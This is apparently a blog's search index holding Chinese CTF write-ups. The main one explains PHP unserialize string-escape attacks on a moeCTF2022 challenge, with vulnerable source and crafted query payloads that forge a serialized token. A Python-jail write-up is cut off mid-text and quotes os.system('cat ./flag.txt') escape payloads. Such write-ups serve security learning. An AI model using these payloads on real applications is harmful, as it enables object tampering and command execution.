<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>通过一道题浅谈php反序列化字符逃逸</title>
    <link href="/2022/10/12/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
    <url>/2022/10/12/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<p>moeCTF2022的一道题目，通过此题讲一下反序列化字符逃逸——值逃逸。</p><p>一些文章是以字符串逃逸的位置来分类的</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">键逃逸<br>值逃逸<br></code></pre></td></tr></table></figure><p>我这里是值逃逸，但是讨论的情况是字符串的增加和减少。</p><p>原理是，序列化字符串依据字段内容长度来判断字段内容的归属，而不是依据双引号。</p><h2 id="baby-unserialize（增）"><a href="#baby-unserialize（增）" class="headerlink" title="baby_unserialize（增）"></a>baby_unserialize（增）</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">moectf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;heizi&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$r</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$s</span>) )&#123;<br>    <span class="hljs-variable">$moe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">moectf</span>(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$emo</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;aiyo&#x27;</span>, <span class="hljs-string">&#x27;ganma&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$moe</span>));<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;moe&#x27;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$emo</span>);<br><br>&#125;<br><br><span class="hljs-string">&#x27;a.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>a.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">moectf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;heizi&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;moe&#x27;</span>] == <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-variable">$moe</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;moe&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$moe</span>-&gt;token==<span class="hljs-string">&#x27;baizi&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>睡前想起来的，这里的session是绕不过的，但是在</p><p>序列化-&gt;反序列化</p><p>这中间，这个<strong>小黑子</strong>进行了如下操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$emo</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;aiyo&#x27;</span>, <span class="hljs-string">&#x27;ganma&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$moe</span>));<br></code></pre></td></tr></table></figure><p>aiyo是4个字符，ganma是5个字符。</p><p>正常序列化出一个字符串是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;baizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>token为最后一个值，既然如此，思路很清晰，构造aiyo，把最后一个token属性挤出去，换上我们构造的token。</p><h3 id="b处构造"><a href="#b处构造" class="headerlink" title="$b处构造"></a>$b处构造</h3><p>构造的token为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>baizi<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>长度为27</p><p>最后要加一个” 把原来的字符串闭合上</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=<span class="hljs-number">1</span>&amp;s=aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>baizi<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="a处构造"><a href="#a处构造" class="headerlink" title="$a处构造"></a>$a处构造</h3><p>构造的token为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">5</span><span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>heizi<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>长度为43</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo<span class="hljs-string">&quot;;s:1:&quot;</span>b<span class="hljs-string">&quot;;s:1:&quot;</span><span class="hljs-number">5</span><span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>baizi<span class="hljs-string">&quot;;&#125;&amp;s=5</span><br></code></pre></td></tr></table></figure><p>因为这里都是借助</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125; <br></code></pre></td></tr></table></figure><p>所以不能够使用键逃逸，键值不可控，但是其实原理都是一样的，只是要挤兑的值不同。</p><h3 id="本地测试源码"><a href="#本地测试源码" class="headerlink" title="本地测试源码"></a>本地测试源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-comment">// $emo=&#x27;O:6:&quot;moectf&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:5:&quot;token&quot;;s:5:&quot;baizi&quot;;&#125;&#x27;;</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">moectf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;heizi&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$r</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$s</span>) )&#123;<br>    <span class="hljs-variable">$moe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">moectf</span>(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$emo</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;aiyo&#x27;</span>, <span class="hljs-string">&#x27;ganma&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$moe</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$emo</span>;<br><br>&#125;<br><span class="hljs-variable">$moe</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$emo</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$moe</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$moe</span>-&gt;token==<span class="hljs-string">&#x27;baizi&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="魔改baby-unserialize（减）"><a href="#魔改baby-unserialize（减）" class="headerlink" title="魔改baby_unserialize（减）"></a>魔改baby_unserialize（减）</h2><p>上面讲得是替换的字符串增加字符的，现在试试字符串长度减少的，稍微麻烦点，因为需要考虑的细节更多，相对而言 增的逃逸更加粗暴。</p><p>直接在我的测试源码修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-comment">// $emo=&#x27;O:6:&quot;moectf&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:5:&quot;token&quot;;s:5:&quot;baizi&quot;;&#125;&#x27;;</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">moectf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;heizi&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$r</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-variable">$s</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$r</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$s</span>) )&#123;<br>    <span class="hljs-variable">$moe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">moectf</span>(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$emo</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;ganma&#x27;</span>, <span class="hljs-string">&#x27;aiyo&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$moe</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$emo</span>;<br><br>&#125;<br><span class="hljs-variable">$moe</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$emo</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$moe</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$moe</span>-&gt;token==<span class="hljs-string">&#x27;baizi&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>现在是把ganma替换为aiyo（没错，我也是小黑子 o(￣ε￣*) </p><p>首先依然放出一个正常的序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;heizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>如果把字符串长度增加的replace比作挤兑，字符串长度减小的replace就是修补。把原来的字符串的内容破坏掉，再用自己构造的内容修好。</p><p>字符串长度减小的替换应该更常见一些，经常是替换过滤字符为空。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;heizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>如果构造a处的逃逸则意味着从</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344656.png" alt="image-20221012120057566"></p><p>黄色标注的双引号开始吞噬后面的字符，即从对应的字段值内容开始吞噬。吞噬的意思是，这一部分值都变为变量的内容。既然是吞噬了，那就破坏了原有的序列化字符串的结构，所以需要在后面再构造一个新的内容作为替换，补上破坏的字符串结构。但是这个新内容不能和吞噬部分放在一个变量，新内容加进去多少字符串，变量的长度就加几，无论怎样，新内容始终被包裹在这个变量内。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="1、要保证格式的正确"><a href="#1、要保证格式的正确" class="headerlink" title="1、要保证格式的正确"></a>1、要保证格式的正确</h4><p>比如吞的时候不能只吞一半，导致双引号闭合不上，或者缺少; }等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;heizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这意味着，构造时，必须考虑到开始的双引号的闭合，同时还需要考虑到双引号与我们构造的替换payload之间的字段名属性、内容，以及字段内容的属性</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344333.png" alt="image-20221012120721358"></p><p>即图中这一块，去掉以后是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;&quot;</span>___<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>heizi<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>这里面$b的内容是我打算用来替换后面的token的payload，所以以$b字段内容的双引号作为闭合。这样后面的payload就不被双引号包裹，逃逸出来了，只需要再构造一个正确的序列化字符串内容就能够被反序列化解析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;489&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;baizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>前面之所以加入;也是为了保证格式，闭合$a的  ;  被吞掉了，所以需要补上。</p><h4 id="2、吞的时候要保证序列化对象属性个数对的上"><a href="#2、吞的时候要保证序列化对象属性个数对的上" class="headerlink" title="2、吞的时候要保证序列化对象属性个数对的上"></a>2、吞的时候要保证序列化对象属性个数对的上</h4><p>附上一张对象序列化字符串格式</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344451.png" alt="image-20221012115319190"></p><p>更多详细内容可参考<a href="https://www.neatstudio.com/show-161-1.shtml">PHP 序列化（serialize）格式详解（Neatstudio.COM）</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;moectf&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;___&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;heizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>比如上述，属性的个数就是3。</p><h3 id="a处构造-1"><a href="#a处构造-1" class="headerlink" title="$a处构造"></a>$a处构造</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?r=ganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganma&amp;s=;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;489&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;baizi&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>ganma的数量为吞噬的属性字符串长度</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344496.png" alt="image-20221012120721358"></p><p>也就是这一段。</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202210121344303.png" alt="image-20221012121649328"></p><h3 id="b处构造-1"><a href="#b处构造-1" class="headerlink" title="$b处构造"></a>$b处构造</h3><p>$b应该构造不了吧 ◐▽◑ </p><p>如果从$b开始吞噬，后面没有地方能够放我们的payload了，token不可控。</p><p>可得出使用前提</p><h3 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h3><p>字符串减少的逃逸需要至少两处payload可控，一处用于吞噬字符串，一处用于替换原有的序列化字符串。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>字符串增加的逃逸可理解为把构造的变量值后面的字符挤兑掉，替换为变量值后面的用于替换的payload，需要计算的是<strong>右边双引号到末尾的长度</strong>（和要替换的payload一致）。只需一处即可完成。</p><p>字符串减少的逃逸可理解为序列化字符串的修补过程，先吞噬掉原来的结构，再用替换的payload补上这部分结构，需要计算的是<strong>左边双引号到替换payload的左边双引号长度</strong>，需要构造两处。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.neatstudio.com/show-161-1.shtml">PHP 序列化（serialize）格式详解（Neatstudio.COM）</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php反序列化</tag>
      
      <tag>字符逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022HNCTF</title>
    <link href="/2022/10/10/2022HNCTF/"/>
    <url>/2022/10/10/2022HNCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="2022HNCTF（自由赛道）"><a href="#2022HNCTF（自由赛道）" class="headerlink" title="2022HNCTF（自由赛道）"></a>2022HNCTF（自由赛道）</h1><p>平台：NSSCTF</p><p>部分题解</p><p>第一次做jail</p><h2 id="Week1-calc-jail-beginner-JAIL"><a href="#Week1-calc-jail-beginner-JAIL" class="headerlink" title="[Week1]calc_jail_beginner(JAIL)"></a>[Week1]calc_jail_beginner(JAIL)</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">It<span class="hljs-comment">&#x27;s an great way to learn an python jail from these challenge! Let&#x27;s play it. Author:crazyman</span><br></code></pre></td></tr></table></figure><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Your goal is to read ./flag.txt</span><br><span class="hljs-comment">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span><br><br>WELCOME = <span 